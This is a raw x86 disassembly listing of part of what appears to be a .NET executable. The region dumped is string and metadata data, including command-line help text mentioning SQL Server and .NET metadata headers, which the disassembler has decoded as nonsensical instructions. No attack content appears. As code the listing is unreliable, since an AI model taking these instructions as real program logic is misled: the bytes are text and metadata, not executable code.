  405966:	and    BYTE PTR gs:[eax+0x72],dh
  40596a:	outs   dx,DWORD PTR ds:[esi]
  40596b:	jo     0x4059d2
  40596d:	jb     0x4059e3
  40596f:	jns    0x40599f
  405971:	or     eax,0x2d0a0d0a
  405976:	ins    BYTE PTR es:[edi],dx
  405977:	and    BYTE PTR [edi+ebp*2+0x67],ch
  40597b:	imul   ebp,DWORD PTR [esi+0x5f],0x656d6974
  405982:	outs   dx,DWORD PTR ds:[esi]
  405983:	jne    0x4059f9
  405985:	or     DWORD PTR [ecx],ecx
  405987:	push   ebx
  405988:	jo     0x4059ef
  40598a:	arpl   WORD PTR [ecx+0x66],bp
  40598d:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  405994:	and    BYTE PTR [esi+0x75],ch
  405997:	ins    DWORD PTR es:[edi],dx
  405998:	bound  esp,QWORD PTR [ebp+0x72]
  40599b:	and    BYTE PTR [edi+0x66],ch
  40599e:	and    BYTE PTR [ebx+0x65],dh
  4059a1:	arpl   WORD PTR [edi+0x6e],bp
  4059a4:	fs jae 0x4059c7
  4059a7:	bound  esp,QWORD PTR [ebp+0x66]
  4059aa:	outs   dx,DWORD PTR ds:[esi]
  4059ab:	jb     0x405a12
  4059ad:	and    BYTE PTR [ecx+0x6e],ah
  4059b0:	or     eax,0x909090a
  4059b5:	or     DWORD PTR [ecx+0x74],esp
  4059b8:	je     0x405a1f
  4059ba:	ins    DWORD PTR es:[edi],dx
  4059bb:	jo     0x405a31
  4059bd:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4059c1:	arpl   WORD PTR [edi+0x6e],bp
  4059c4:	outs   dx,BYTE PTR ds:[esi]
  4059c5:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  4059ca:	imul   ebp,DWORD PTR [ebp+0x65],0x756f2073
  4059d1:	je     0x405a01
  4059d3:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4059d7:	and    BYTE PTR [esi+0x61],dh
  4059da:	ins    BYTE PTR es:[edi],dx
  4059db:	jne    0x405a42
  4059dd:	and    BYTE PTR [ebp+0x75],ch
  4059e0:	jae    0x405a56
  4059e2:	and    BYTE PTR [edx+0x65],ah
  4059e5:	or     eax,0x909090a
  4059ea:	or     DWORD PTR [edx+0x65],esp
  4059ed:	je     0x405a66
  4059ef:	gs outs dx,BYTE PTR gs:[esi]
  4059f2:	and    BYTE PTR [ecx],dh
  4059f4:	and    BYTE PTR [ecx+0x6e],ah
  4059f7:	and    BYTE PTR fs:[esi],dh
  4059fa:	xor    eax,0x2e343335
  4059ff:	and    BYTE PTR [esi+0x6f],cl
  405a02:	je     0x405a24
  405a04:	jae    0x405a76
  405a06:	arpl   WORD PTR gs:[ecx+0x66],bp
  405a0a:	jns    0x405a75
  405a0c:	outs   dx,BYTE PTR ds:[esi]
  405a0d:	and    BYTE PTR [di],ch
  405a10:	ins    BYTE PTR es:[edi],dx
  405a11:	and    BYTE PTR [edi+0x72],ch
  405a14:	or     eax,0x909090a
  405a19:	or     DWORD PTR [ebx+0x65],esi
  405a1c:	je     0x405a92
  405a1e:	imul   ebp,DWORD PTR [esi+0x67],0x676f6c20
  405a25:	imul   ebp,DWORD PTR [esi+0x5f],0x656d6974
  405a2c:	outs   dx,DWORD PTR ds:[esi]
  405a2d:	jne    0x405aa3
  405a2f:	and    BYTE PTR [eax],dh
  405a31:	and    BYTE PTR [ebx+0x70],dh
  405a34:	arpl   WORD PTR gs:[ecx+0x66],bp
  405a38:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  405a3f:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  405a43:	outs   dx,DWORD PTR gs:[esi]
  405a45:	jne    0x405abb
  405a47:	or     eax,0x909090a
  405a4c:	or     DWORD PTR [edi+ebp*2+0x20],esi
  405a50:	bound  esp,QWORD PTR [ebp+0x20]
  405a53:	imul   ebp,DWORD PTR [esi+0x66],0x74696e69
  405a5a:	gs cs or eax,0x2d0a0d0a
  405a61:	aas    
  405a62:	or     DWORD PTR [ecx],ecx
  405a64:	or     DWORD PTR [ecx],ecx
  405a66:	inc    esp
  405a67:	imul   esi,DWORD PTR [ebx+0x70],0x7379616c
  405a6e:	and    BYTE PTR [ebx+0x6f],ah
  405a71:	ins    DWORD PTR es:[edi],dx
  405a72:	ins    DWORD PTR es:[edi],dx
  405a73:	popa   
  405a74:	outs   dx,BYTE PTR ds:[esi]
  405a75:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
  405a7a:	and    BYTE PTR gs:[eax+0x65],ch
  405a7e:	ins    BYTE PTR es:[edi],dx
  405a7f:	jo     0x405aaf
  405a81:	add    DWORD PTR [ebx],esp
  405a83:	inc    ecx
  405a84:	outs   dx,BYTE PTR ds:[esi]
  405a85:	and    BYTE PTR [ecx+0x6e],ch
  405a88:	je     0x405aef
  405a8a:	jb     0x405afa
  405a8c:	popa   
  405a8d:	ins    BYTE PTR es:[edi],dx
  405a8e:	and    BYTE PTR [ebp+0x78],ah
  405a91:	arpl   WORD PTR [ebp+0x70],sp
  405a94:	je     0x405aff
  405a96:	outs   dx,DWORD PTR ds:[esi]
  405a97:	outs   dx,BYTE PTR ds:[esi]
  405a98:	and    BYTE PTR [edi+0x63],ch
  405a9b:	arpl   WORD PTR [ebp+0x72],si
  405a9e:	jb     0x405b05
  405aa0:	cmp    ah,BYTE PTR fs:[eax]
  405aa3:	jnp    0x405ad5
  405aa5:	jge    0x405aa8
  405aa7:	cmp    eax,DWORD PTR [ecx+0x6e]
  405aaa:	and    BYTE PTR [ebp+0x78],ah
  405aad:	arpl   WORD PTR [ebp+0x70],sp
  405ab0:	je     0x405b1b
  405ab2:	outs   dx,DWORD PTR ds:[esi]
  405ab3:	outs   dx,BYTE PTR ds:[esi]
  405ab4:	and    BYTE PTR [edi+0x63],ch
  405ab7:	arpl   WORD PTR [ebp+0x72],si
  405aba:	jb     0x405b21
  405abc:	and    BYTE PTR fs:[edi+0x6e],ch
  405ac0:	and    BYTE PTR [ecx+0x20],ah
  405ac3:	arpl   WORD PTR [edi+0x6e],bp
  405ac6:	outs   dx,BYTE PTR ds:[esi]
  405ac7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405acc:	outs   dx,BYTE PTR ds:[esi]
  405acd:	and    BYTE PTR [edi+ebp*2+0x20],dh
  405ad1:	push   ebx
  405ad2:	push   ecx
  405ad3:	dec    esp
  405ad4:	and    BYTE PTR [ebx+0x65],dl
  405ad7:	jb     0x405b4f
  405ad9:	gs jb  0x405afc
  405adc:	jnp    0x405b0e
  405ade:	jge    0x405b1a
  405ae0:	jnp    0x405b13
  405ae2:	jge    0x405ae5
  405ae4:	sbb    eax,0x7373694d
  405ae9:	imul   ebp,DWORD PTR [esi+0x67],0x6d6f6320
  405af0:	ins    DWORD PTR es:[edi],dx
  405af1:	popa   
  405af2:	outs   dx,BYTE PTR ds:[esi]
  405af3:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
  405af8:	and    BYTE PTR gs:[ecx+0x72],ah
  405afc:	addr16 jne 0x405b6c
  405aff:	outs   dx,BYTE PTR gs:[esi]
  405b01:	je     0x405b04
  405b03:	and    al,BYTE PTR [ebp+0x6e]
  405b06:	je     0x405b6d
  405b08:	jb     0x405b2a
  405b0a:	je     0x405b74
  405b0c:	and    BYTE PTR gs:[eax+0x61],dh
  405b10:	jae    0x405b85
  405b12:	ja     0x405b83
  405b14:	jb     0x405b7a
  405b16:	and    BYTE PTR [esi+0x6f],ah
  405b19:	jb     0x405b3b
  405b1b:	jae    0x405b82
  405b1d:	jb     0x405b95
  405b1f:	gs jb  0x405b42
  405b22:	jnp    0x405b54
  405b24:	jge    0x405b60
  405b26:	add    DWORD PTR [edx*2+0x6365726e],ebp
  405b2d:	outs   dx,DWORD PTR ds:[esi]
  405b2e:	outs   dx,BYTE PTR ds:[si]
  405b30:	imul   edi,DWORD PTR [edx+0x65],0x6f632064
  405b37:	ins    DWORD PTR es:[edi],dx
  405b38:	ins    DWORD PTR es:[edi],dx
  405b39:	popa   
  405b3a:	outs   dx,BYTE PTR ds:[esi]
  405b3b:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
  405b40:	and    BYTE PTR gs:[edi+0x70],ch
  405b44:	je     0x405baf
  405b46:	outs   dx,DWORD PTR ds:[esi]
  405b47:	outs   dx,BYTE PTR ds:[esi]
  405b48:	and    BYTE PTR [edi+0x72],ch
  405b4b:	and    BYTE PTR [ecx+0x72],ah
  405b4e:	addr16 jne 0x405bbe
  405b51:	outs   dx,BYTE PTR gs:[esi]
  405b53:	je     0x405b97
  405b55:	push   ebx
  405b56:	dec    edx
  405b57:	inc    edx
  405b58:	add    DWORD PTR [eax],eax
  405b5a:	add    DWORD PTR [eax],eax
  405b5c:	add    BYTE PTR [eax],al
  405b5e:	add    BYTE PTR [eax],al
  405b60:	or     al,0x0
  405b62:	add    BYTE PTR [eax],al
  405b64:	jbe    0x405b9a
  405b66:	xor    BYTE PTR cs:[esi],ch
  405b69:	xor    esi,DWORD PTR [eax]
  405b6b:	xor    esi,DWORD PTR [ecx]
  405b6d:	cmp    DWORD PTR [eax],eax
  405b6f:	add    BYTE PTR [eax],al
  405b71:	add    BYTE PTR ds:0x6c00,al
  405b77:	add    BYTE PTR [ebx+ebx*1+0x0],ah
  405b7b:	add    BYTE PTR [ebx],ah
  405b7d:	jle    0x405b7f
  405b7f:	add    al,dl
  405b81:	sbb    eax,DWORD PTR [eax]
  405b83:	add    BYTE PTR [eax],dh
  405b85:	sbb    eax,0x53230000
  405b8a:	je     0x405bfe
  405b8c:	imul   ebp,DWORD PTR [esi+0x67],0x73
  405b93:	add    BYTE PTR [eax],al
  405b95:	cmp    DWORD PTR [eax],eax
  405b97:	add    al,al
  405b99:	or     eax,0x55230000
  405b9e:	push   ebx
  405b9f:	add    al,al
  405ba1:	inc    esi
  405ba2:	add    BYTE PTR [eax],al
  405ba4:	adc    BYTE PTR [eax],al
  405ba6:	add    BYTE PTR [eax],al
  405ba8:	and    eax,DWORD PTR [edi+0x55]
  405bab:	dec    ecx
  405bac:	inc    esp
  405bad:	add    BYTE PTR [eax],al
  405baf:	add    al,dl
  405bb1:	inc    esi
  405bb2:	add    BYTE PTR [eax],al
  405bb4:	xchg   esp,eax
  405bb5:	push   cs
  405bb6:	add    BYTE PTR [eax],al
  405bb8:	and    eax,DWORD PTR [edx+0x6c]
  405bbb:	outs   dx,DWORD PTR ds:[esi]
  405bbc:	bound  eax,QWORD PTR [eax]
  405bbe:	add    BYTE PTR [eax],al
  405bc0:	add    BYTE PTR [eax],al
  405bc2:	add    BYTE PTR [eax],al
  405bc4:	add    al,BYTE PTR [eax]
  405bc6:	add    BYTE PTR [ecx],al
  405bc8:	push   edi
  405bc9:	pop    ebp
  405bca:	mov    ds:0x7091d,al
  405bcf:	add    BYTE PTR [eax],al
  405bd1:	cli    
  405bd2:	and    eax,0x160033
  405bd7:	add    BYTE PTR [ecx],al
  405bd9:	add    BYTE PTR [eax],al
  405bdb:	add    BYTE PTR [ebx+0x0],bl
  405bde:	add    BYTE PTR [eax],al
  405be0:	push   ss
  405be1:	add    BYTE PTR [eax],al
  405be3:	add    bl,dl
  405be5:	add    BYTE PTR [eax],al
  405be7:	add    BYTE PTR [eax+eax*1+0x0],bl
  405beb:	add    BYTE PTR [eax+eax*1],bh
  405bee:	add    BYTE PTR [eax],al
  405bf0:	mov    al,0x0
  405bf2:	add    BYTE PTR [eax],al
  405bf4:	call   0x0:0x13000000
  405bfb:	add    BYTE PTR [ecx],al
  405bfd:	add    BYTE PTR [eax],al
  405bff:	add    BYTE PTR [eax+eax*1],dl
  405c02:	add    BYTE PTR [eax],al
  405c04:	or     eax,DWORD PTR [eax]
  405c06:	add    BYTE PTR [eax],al
  405c08:	xor    eax,DWORD PTR [eax]
  405c0a:	add    BYTE PTR [eax],al
  405c0c:	xor    eax,0x1000000
  405c11:	add    BYTE PTR [eax],al
  405c13:	add    BYTE PTR [eax+eax*1],cl
  405c16:	add    BYTE PTR [eax],al
  405c18:	add    eax,DWORD PTR [eax]
  405c1a:	add    BYTE PTR [eax],al
  405c1c:	add    DWORD PTR [eax],eax
  405c1e:	add    BYTE PTR [eax],al
  405c20:	or     DWORD PTR [eax],eax
  405c22:	add    BYTE PTR [eax],al
  405c24:	add    DWORD PTR [eax],eax
  405c26:	add    BYTE PTR [eax],al
  405c28:	or     al,BYTE PTR [eax]
  405c2a:	add    BYTE PTR [eax],al
  405c2c:	add    DWORD PTR [eax],eax
  405c2e:	add    BYTE PTR [eax],al
  405c30:	add    BYTE PTR [eax],al
  405c32:	or     al,BYTE PTR [eax]
  405c34:	add    DWORD PTR [eax],eax
  405c36:	add    BYTE PTR [eax],al
  405c38:	add    BYTE PTR [eax],al
  405c3a:	push   es
  405c3b:	add    BYTE PTR [edi+0x1],ah
  405c3e:	pusha  
  405c3f:	add    DWORD PTR [esi],eax
  405c41:	add    BYTE PTR [ebp+0x1],dh
  405c44:	pusha  
  405c45:	add    DWORD PTR [esi],eax
  405c47:	add    BYTE PTR [edx+0x1],bh
  405c4a:	pusha  
  405c4b:	add    DWORD PTR [edx],ecx
  405c4d:	add    BYTE PTR [edx+0x4],ah
  405c50:	push   edi
  405c51:	add    al,0xe
  405c53:	add    BYTE PTR [ecx+0xe04ad04],bh
  405c59:	add    BYTE PTR [ebx],al
  405c5b:	add    eax,0xe04ad
  405c60:	inc    ebp
  405c61:	add    eax,0xe04ad
  405c66:	add    ax,0x4ad
  405c6a:	push   es
  405c6b:	add    BYTE PTR [ebp+0x6087a08],dl
  405c71:	add    bh,cl
  405c73:	or     eax,0x6087a
  405c78:	(bad)  
  405c79:	or     eax,0x60160
  405c7e:	add    eax,0x601600e
  405c83:	add    al,cl
  405c85:	push   cs
  405c86:	mov    bh,0xe
  405c88:	push   es
  405c89:	add    cl,bh
  405c8b:	push   cs
  405c8c:	in     al,0xe
  405c8e:	push   es
  405c8f:	add    cl,bh
  405c91:	adc    dl,bl
  405c93:	adc    BYTE PTR [esi],al
  405c95:	add    bh,dl
  405c97:	adc    edx,ebx
  405c99:	adc    BYTE PTR [esi],al
  405c9b:	add    ch,bh
  405c9d:	adc    ebx,ebp
  405c9f:	adc    DWORD PTR [esi],eax
  405ca1:	add    BYTE PTR [esi],dl
  405ca3:	adc    ch,bl
  405ca5:	adc    DWORD PTR [esi],eax
  405ca7:	add    BYTE PTR [edi],ch
  405ca9:	adc    ch,bl
  405cab:	adc    DWORD PTR [esi],eax
  405cad:	add    BYTE PTR [edx+0x12],cl
  405cb0:	jmp    0x405cc3
  405cb2:	push   es
  405cb3:	add    BYTE PTR [ebx+0x12],ah
  405cb6:	jmp    0x405cc9
  405cb8:	push   es
  405cb9:	add    BYTE PTR [eax+0x611eb12],al
  405cbf:	add    BYTE PTR [esi+0x611eb12],ah
  405cc5:	add    BYTE PTR [edi+0x611eb12],bh
  405ccb:	add    dl,bl
  405ccd:	adc    ch,bl
  405ccf:	adc    DWORD PTR [esi],eax
  405cd1:	add    cl,dh
  405cd3:	adc    ch,bl
  405cd5:	adc    DWORD PTR [esi],eax
  405cd7:	add    BYTE PTR [eax],ch
  405cd9:	adc    ecx,DWORD PTR [ebx+edx*1]
  405cdc:	push   es
  405cdd:	add    BYTE PTR [ebx+edx*1+0xc],al
  405ce1:	adc    eax,DWORD PTR [esi]
  405ce3:	add    BYTE PTR [esi+0x13],ah
  405ce6:	push   ebx
  405ce7:	adc    esi,DWORD PTR [edi+0x0]
  405cea:	jp     0x405cff
  405cec:	add    BYTE PTR [eax],al
  405cee:	push   es
  405cef:	add    BYTE PTR [ecx+0x6138913],ch
  405cf5:	add    cl,cl
  405cf7:	adc    ecx,DWORD PTR [ecx-0xcfff9ed]
  405cfd:	adc    esp,DWORD PTR [eax+0x1]
  405d00:	push   es
  405d01:	add    BYTE PTR ds:0xa13fb14,al
  405d07:	add    BYTE PTR [edx],ah
  405d09:	adc    al,0x57
  405d0b:	add    al,0xe
  405d0d:	add    BYTE PTR [edx+0x14],bh
  405d10:	lods   eax,DWORD PTR ds:[esi]
  405d11:	add    al,0xe
  405d13:	add    BYTE PTR [edx+0x604ad14],dl
  405d19:	add    BYTE PTR [esi+eax*1+0x60],bh
  405d1d:	add    DWORD PTR [esi],eax
  405d1f:	add    BYTE PTR [esp+edx*1+0x60160],dh
  405d26:	fcom   DWORD PTR [eax+eiz*2]
  405d29:	add    DWORD PTR [edx],edx
  405d2b:	add    al,bl
  405d2d:	adc    al,0x60
  405d2f:	add    DWORD PTR [esi],eax
  405d31:	add    ch,bh
  405d33:	adc    al,0x60
  405d35:	add    DWORD PTR [esi],eax
  405d37:	add    BYTE PTR [ebx],al
  405d39:	adc    eax,0x60160
  405d3e:	and    BYTE PTR ds:0x6150d,dl
  405d44:	inc    edi
  405d45:	adc    eax,0x160160
  405d4a:	jo     0x405d61
  405d4c:	pop    edx
  405d4d:	adc    eax,0x157d0016
  405d52:	pop    edx
  405d53:	adc    eax,0x159b0006
  405d58:	or     eax,0xc1001615
  405d5d:	adc    eax,0x6155a
  405d62:	jmp    0x641bd7c
  405d67:	add    BYTE PTR [esi+edx*1],dl
  405d6a:	pusha  
  405d6b:	add    DWORD PTR [esi],ecx
  405d6d:	add    BYTE PTR [ecx],bh
  405d6f:	push   ss
  405d70:	and    eax,0xcf001216
  405d75:	or     eax,0x12087a
  405d7a:	(bad)  
  405d7b:	or     eax,0x2b0160
  405d80:	ins    DWORD PTR es:[edi],dx
  405d81:	push   ss
  405d82:	add    BYTE PTR [eax],al
  405d84:	push   cs
  405d85:	add    BYTE PTR [edi+0xe04ad16],cl
  405d8b:	add    BYTE PTR [ebx+0x1204ad16],ah
  405d91:	add    BYTE PTR ds:0xe01600e,al
  405d97:	add    BYTE PTR [edi+0x604ad16],bh
  405d9d:	add    bl,dl
  405d9f:	push   ss
  405da0:	pusha  
  405da1:	add    DWORD PTR [esi],ecx
  405da3:	add    ch,ah
  405da5:	push   ss
  405da6:	lods   eax,DWORD PTR ds:[esi]
  405da7:	add    al,0x16
  405da9:	add    BYTE PTR [ebp+0x16155a17],dh
  405daf:	add    BYTE PTR ds:0x16180a18,bl
  405db5:	add    BYTE PTR [eax+ebx*1+0x5a],cl
  405db9:	adc    eax,0x185a0016
  405dbe:	or     bl,BYTE PTR [eax]
  405dc0:	sbb    al,BYTE PTR [eax]
  405dc2:	fstp   DWORD PTR [eax]
  405dc4:	mov    bl,0x18
  405dc6:	push   ds
  405dc7:	add    BYTE PTR [eax+ebx*1+0x5a],cl
  405dcb:	adc    eax,0x68a0022
  405dd0:	add    bl,BYTE PTR [ecx]
  405dd2:	and    al,BYTE PTR [eax]
  405dd4:	sbb    DWORD PTR cs:[edx],eax
  405dd7:	sbb    DWORD PTR [edx],esp
  405dd9:	add    BYTE PTR [edi+0x19],cl
  405ddc:	add    bl,BYTE PTR [ecx]
  405dde:	push   es
  405ddf:	add    BYTE PTR [edi+0x19],bh
  405de2:	pusha  
  405de3:	add    DWORD PTR [esi],eax
  405de5:	add    BYTE PTR [esi+0xe016019],dl
  405deb:	add    BYTE PTR [ebx+0xe04ad19],ch
  405df1:	add    BYTE PTR [edi+0x1204ad19],dh
  405df7:	add    BYTE PTR [ebx],al
  405df9:	adc    eax,0xe0160
  405dfe:	loopne 0x405e19
  405e00:	lods   eax,DWORD PTR ds:[esi]
  405e01:	add    al,0x6
  405e03:	add    BYTE PTR ds:0x601601a,cl
  405e09:	add    BYTE PTR [edi],ah
  405e0b:	sbb    ah,BYTE PTR [eax+0x1]
  405e0e:	push   es
  405e0f:	add    BYTE PTR [ecx+0x1a],cl
  405e12:	jmp    0x405e25
  405e14:	push   es
  405e15:	add    BYTE PTR [eax+0x613fb1a],ah
  405e1b:	add    cl,bh
  405e1d:	sbb    bl,dl
  405e1f:	adc    BYTE PTR [esi],al
  405e21:	add    BYTE PTR [ebx+0x613fb1b],cl
  405e27:	add    BYTE PTR [ecx+0x601601b],dh
  405e2d:	add    bl,dh
  405e2f:	sbb    ebx,edx
  405e31:	adc    BYTE PTR [esi],al
  405e33:	add    BYTE PTR [ecx],cl
  405e35:	sbb    al,0xda
  405e37:	adc    BYTE PTR [esi],ah
  405e39:	add    BYTE PTR [esp+ebx*1],ch
  405e3c:	adc    al,0x1c
  405e3e:	push   es
  405e3f:	add    BYTE PTR [ebx+0x1c],al
  405e42:	push   ebx
  405e43:	adc    eax,DWORD PTR [esi]
  405e45:	add    BYTE PTR [eax+0x1c],ah
  405e48:	mov    DWORD PTR [ebx],edx
  405e4a:	add    BYTE PTR es:[eax+0x261ca21c],bh
  405e51:	add    cl,dl
  405e53:	sbb    al,0xa2
  405e55:	sbb    al,0x6
  405e57:	add    dh,dh
  405e59:	sbb    al,0xe6
  405e5b:	sbb    al,0x0
  405e5d:	add    BYTE PTR [eax],al
  405e5f:	add    BYTE PTR [ecx],al
  405e61:	add    BYTE PTR [eax],al
  405e63:	add    BYTE PTR [eax],al
  405e65:	add    BYTE PTR [ecx],al
  405e67:	add    BYTE PTR [ecx],al
  405e69:	add    BYTE PTR [eax+0x1a001001],al
  405e6f:	add    BYTE PTR [eax],al
  405e71:	add    BYTE PTR ds:0x1000100,al
  405e77:	add    BYTE PTR [eax],al
  405e79:	add    BYTE PTR [eax],dl
  405e7b:	add    BYTE PTR [esi],ch
  405e7d:	add    BYTE PTR [edx],bh
  405e7f:	add    BYTE PTR ds:0x2002000,al
  405e85:	add    BYTE PTR [ebx],al
  405e87:	add    BYTE PTR [eax],dl
  405e89:	add    BYTE PTR [esi+0x0],al
  405e8c:	add    BYTE PTR [eax],al
  405e8e:	add    eax,0xf002700
  405e93:	add    BYTE PTR [ecx],al
  405e95:	add    DWORD PTR [eax],edx
  405e97:	add    BYTE PTR [ebx+0x0],cl
  405e9a:	pusha  
  405e9b:	add    BYTE PTR ds:0x10003600,al
  405ea1:	add    BYTE PTR [ecx],al
  405ea3:	add    DWORD PTR [eax],edx
  405ea5:	add    BYTE PTR [eax+0x0],bh
  405ea8:	pusha  
  405ea9:	add    BYTE PTR ds:0x15003a00,al
  405eaf:	add    BYTE PTR [ecx],al
  405eb1:	add    DWORD PTR [eax],edx
  405eb3:	add    BYTE PTR [edx+0x5006000],cl
  405eb9:	add    BYTE PTR [ecx+0x0],al
  405ebc:	push   ds
  405ebd:	add    BYTE PTR [ecx],al
  405ebf:	add    DWORD PTR [eax],edx
  405ec1:	add    BYTE PTR [eax+0x5006000],ah
  405ec7:	add    BYTE PTR [edx+0x0],al
  405eca:	and    BYTE PTR [eax],al
  405ecc:	add    DWORD PTR [ecx],eax
  405ece:	adc    BYTE PTR [eax],al
  405ed0:	scas   eax,DWORD PTR es:[edi]
  405ed1:	add    BYTE PTR [eax+0x0],ah
  405ed4:	add    eax,0x27004700
  405ed9:	add    BYTE PTR [ecx],al
  405edb:	add    DWORD PTR [eax],edx
  405edd:	add    BYTE PTR [eax+0x5006000],bh
  405ee3:	add    BYTE PTR [ecx+0x0],cl
  405ee6:	sub    al,0x0
  405ee8:	add    eax,DWORD PTR [ecx]
  405eea:	add    BYTE PTR [eax],al
  405eec:	mov    edi,0x9000000
  405ef1:	add    BYTE PTR [ecx+0x0],bl
  405ef4:	inc    ebx
  405ef5:	add    BYTE PTR [ebx],al
  405ef7:	add    DWORD PTR [eax],eax
  405ef9:	add    dl,cl
  405efb:	add    BYTE PTR [eax],al
  405efd:	add    BYTE PTR [ecx],cl
  405eff:	add    BYTE PTR [edi+0x0],bl
  405f02:	inc    ebx
  405f03:	add    BYTE PTR [ebx],al
  405f05:	add    DWORD PTR [eax],eax
  405f07:	add    ah,bl
  405f09:	add    BYTE PTR [eax],al
  405f0b:	add    BYTE PTR [ecx],cl
  405f0d:	add    BYTE PTR [ebx+0x0],ah
  405f10:	inc    ebx
  405f11:	add    BYTE PTR [ebx],al
  405f13:	add    DWORD PTR [eax],eax
  405f15:	add    cl,dh
  405f17:	add    BYTE PTR [eax],al
  405f19:	add    BYTE PTR [ecx],cl
  405f1b:	add    BYTE PTR [edx+0x0],ch
  405f1e:	inc    ebx
  405f1f:	add    BYTE PTR [ebx],al
  405f21:	add    DWORD PTR [eax],eax
  405f23:	add    BYTE PTR [ecx],cl
  405f25:	add    DWORD PTR [eax],eax
  405f27:	add    BYTE PTR [ecx],cl
  405f29:	add    BYTE PTR [eax+eax*1+0x43],bh
  405f2d:	add    BYTE PTR [ebx],al
  405f2f:	add    BYTE PTR [eax],dl
  405f31:	add    BYTE PTR [esi+0x0],al
  405f34:	add    BYTE PTR [eax],al
  405f36:	add    eax,0x43008300
  405f3b:	add    BYTE PTR [ebx],al
  405f3d:	add    DWORD PTR [eax],eax
  405f3f:	add    BYTE PTR [ebx],bl
  405f41:	add    DWORD PTR [eax],eax
  405f43:	add    BYTE PTR [ecx],cl
  405f45:	add    BYTE PTR [ebx+0xb004400],ah
  405f4b:	add    DWORD PTR [eax],edx
  405f4d:	add    BYTE PTR [edx],ah
  405f4f:	add    DWORD PTR [eax],eax
  405f51:	add    BYTE PTR ds:0x4400c300,cl
  405f57:	add    BYTE PTR [edx],al
  405f59:	add    DWORD PTR [eax],eax
  405f5b:	add    BYTE PTR [edi],ah
  405f5d:	add    DWORD PTR [eax],eax
  405f5f:	add    BYTE PTR [ecx],cl
  405f61:	add    ch,al
  405f63:	add    BYTE PTR [ebp+0x0],al
  405f66:	add    DWORD PTR [ecx],eax
  405f68:	adc    BYTE PTR [eax],al
  405f6a:	das    
  405f6b:	add    DWORD PTR [eax+0x0],esp
  405f6e:	add    eax,0x4500c900
  405f73:	add    BYTE PTR [ecx],al
  405f75:	add    BYTE PTR [eax],dl
  405f77:	add    BYTE PTR [esi],bh
  405f79:	add    DWORD PTR [eax+0x0],esp
  405f7c:	add    eax,0x4b00ce00
  405f81:	add    BYTE PTR [eax],al
  405f83:	add    BYTE PTR [eax],dl
  405f85:	add    BYTE PTR [ebp+0x1],cl
  405f88:	cmp    al,BYTE PTR [eax]
  405f8a:	add    eax,0x5000d200
  405f8f:	add    BYTE PTR [esi-0x80],dl
  405f92:	test   BYTE PTR [ecx],al
  405f94:	or     al,BYTE PTR [eax]
  405f96:	push   esi
  405f97:	adc    BYTE PTR [edx+0x56001e01],0x80
  405f9e:	lahf   
  405f9f:	add    DWORD PTR [esi],ebx
  405fa1:	add    BYTE PTR [esi-0x80],dl
  405fa4:	lods   al,BYTE PTR ds:[esi]
  405fa5:	add    DWORD PTR [esi],ebx
  405fa7:	add    BYTE PTR [esi-0x80],dl
  405faa:	mov    ecx,0x56001e01
  405faf:	add    cl,0x1
  405fb2:	or     al,BYTE PTR [eax]
  405fb4:	push   esi
  405fb5:	adc    dh,0x1
  405fb8:	or     al,BYTE PTR [eax]
  405fba:	push   esi
  405fbb:	sub    al,0x1
  405fbe:	or     al,BYTE PTR [eax]
  405fc0:	push   esi
  405fc1:	or     BYTE PTR [edx+eax*1],0xa
  405fc5:	add    BYTE PTR [esi-0x80],dl
  405fc8:	add    cl,BYTE PTR es:[edx]
  405fcb:	add    BYTE PTR [esi-0x80],dl
  405fce:	inc    esp
  405fcf:	add    cl,BYTE PTR [edx]
  405fd1:	add    BYTE PTR [esi-0x80],dl
  405fd4:	data16 add cl,BYTE PTR [edx]
  405fd7:	add    BYTE PTR [esi-0x80],dl
  405fda:	jl     0x405fde
  405fdc:	or     al,BYTE PTR [eax]
  405fde:	push   esi
  405fdf:	sbb    BYTE PTR [ecx+0x56000a02],0x80
  405fe6:	mov    dl,0x2
  405fe8:	or     al,BYTE PTR [eax]
  405fea:	push   esi
  405feb:	or     bl,0x2
  405fee:	or     al,BYTE PTR [eax]
  405ff0:	push   esi
  405ff1:	sbb    dh,0x2
  405ff4:	or     al,BYTE PTR [eax]
  405ff6:	push   esi
  405ff7:	xor    cl,0x2
  405ffa:	or     al,BYTE PTR [eax]
  405ffc:	push   esi
  405ffd:	add    BYTE PTR [edi],0x3
  406000:	or     al,BYTE PTR [eax]
  406002:	push   esi
  406003:	sbb    BYTE PTR [ebx+eax*1],0xa
  406007:	add    BYTE PTR [esi-0x80],dl
  40600a:	das    
  40600b:	add    ecx,DWORD PTR [edx]
  40600d:	add    BYTE PTR [esi-0x80],dl
  406010:	inc    ebx
  406011:	add    ecx,DWORD PTR [edx]
  406013:	add    BYTE PTR [esi-0x80],dl
  406016:	push   esi
  406017:	add    ecx,DWORD PTR [edx]
  406019:	add    BYTE PTR [esi-0x80],dl
  40601c:	imul   eax,DWORD PTR [ebx],0x8056000a
  406022:	jg     0x406027
  406024:	jl     0x406028
  406026:	push   esi
  406027:	adc    BYTE PTR [ecx+0x56027c03],0x80
  40602e:	lods   eax,DWORD PTR ds:[esi]
  40602f:	add    ecx,DWORD PTR [edx]
  406031:	add    BYTE PTR [esi-0x80],dl
  406034:	ret    0xa03
  406037:	add    BYTE PTR [esi-0x80],dl
  40603a:	fiadd  DWORD PTR [ebx]
  40603c:	or     al,BYTE PTR [eax]
  40603e:	push   esi
  40603f:	xor    bh,0x3
  406042:	or     al,BYTE PTR [eax]
  406044:	push   esi
  406045:	adc    BYTE PTR [eax],0x4
  406048:	or     al,BYTE PTR [eax]
  40604a:	adc    DWORD PTR [eax],eax
  40604c:	ins    BYTE PTR es:[edi],dx
  40604d:	add    al,0x90
  40604f:	add    edx,DWORD PTR [ecx]
  406051:	add    BYTE PTR [edi+0x4],dh
  406054:	xchg   esp,eax
  406055:	add    edx,DWORD PTR [ecx]
  406057:	add    bh,cl
  406059:	add    al,0xa1
  40605b:	add    edx,DWORD PTR [ecx]
  40605d:	add    cl,bl
  40605f:	add    al,0x1e
  406061:	add    BYTE PTR [ecx],dl
  406063:	add    cl,ah
